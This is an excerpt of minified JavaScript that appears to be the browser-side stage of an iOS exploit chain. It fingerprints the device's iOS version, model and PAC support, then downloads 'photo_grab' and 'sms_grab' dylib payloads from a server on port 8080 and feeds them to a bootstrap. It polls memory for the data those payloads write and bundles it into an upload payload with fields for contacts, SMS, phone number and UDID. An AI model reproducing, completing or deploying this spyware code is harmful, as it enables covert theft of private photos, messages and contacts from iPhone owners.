...
function YA() {/* Original: YA → resolveSymbols */
    ...
    const E = {
        ...
        TA(A, g, D, M) {
            try {
                ...
                const platform = (window.moduleManager && window.moduleManager.getModuleByName &&
                    window.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState) || {};
                let iosVersion = '';
                const iosMatch = ua.match(/OS (\d+)_(\d+)(?:_(\d+))? like Mac OS X/);
                if (iosMatch) {
                    iosVersion = iosMatch[1] + '.' + iosMatch[2] + (iosMatch[3] ? '.' + iosMatch[3] : '');
                }
                const deviceMatch = ua.match(/(?:iPhone|iPad|iPod)(?:\s+(\w+))?/);
                const payload = JSON.stringify({
                    data_payload: A,
                    metadata: g,
                    ios_version: iosVersion,
                    device_model: deviceMatch ? deviceMatch[0] : '',
                    udid: '',
                    phone_number: '',
                    contacts: [],
                    sms: [],
                    ...
                    system_info: {
                        ...
                        hasPAC: platform.hasPAC || false,
                        browser: platform.browserType || ''
                    }
                });
        ...
        // Generic: feed custom dylib container to bootstrap
        async feedCustomDylib(name, label) {
            try {
                window.log("[" + label + "] Downloading " + name + " container...");
                const url = window.location.protocol + "//" + window.location.hostname
                    + ":8080/payloads/" + name + "/raw.bin";
                const resp = await fetch(url);
                if (!resp.ok) { window.log("[" + label + "] Download failed: " + resp.status); return; }
                const buf = await resp.arrayBuffer();
                E.feedRawBuffer(buf);
                window.log("[" + label + "] Fed " + buf.byteLength + " bytes to bootstrap");
            } catch (e) {
                window.log("[" + label + "] Error: " + e.message);
            }
        },
        async feedPhotoGrab() { return E.feedCustomDylib("photo_grab", "PHOTO"); },
        async feedSmsGrab()   { return E.feedCustomDylib("sms_grab", "SMS"); },
        sA() {
        ...
        wA() {
            ...
            } else if (D[0] === UA || D[0] === BA) {
                // BA = dylib wrote data, treat as upload trigger
                D[0] = QA;
                const A = new Uint8Array(g.buffer, sA, kA);
                let M = "";
                for (let g = 0; A[g] && g < A.length; g++) M += String.fromCharCode(A[g]);
            ...
            } else if (D[0] === QA || D[0] === BA) {
                // Dylib may have written data without changing state - poll the buffers
                const A = new Uint8Array(g.buffer, sA, 256);
                const C = new Uint8Array(g.buffer, FA, 256);
                let hasData = false;
                for (let i = 0; i < 256; i++) { if (A[i] !== 0) { hasData = true; break; } }
                if (!hasData) for (let i = 0; i < 256; i++) { if (C[i] !== 0) { hasData = true; break; } }
                if (hasData) {
                    let M = "";
                    for (let g = 0; A[g] && g < 256; g++) M += String.fromCharCode(A[g]);
                    let I = "";
                    for (let A = 0; C[A] && A < 256; A++) I += String.fromCharCode(C[A]);
                    if (M.length > 0 || I.length > 0) {
                        E.TA(M, I, E.NA, E.EA);
                    }
                }
    ...
    window.__photoFeed = E.feedCustomDylib.bind(E);
    return E;
}
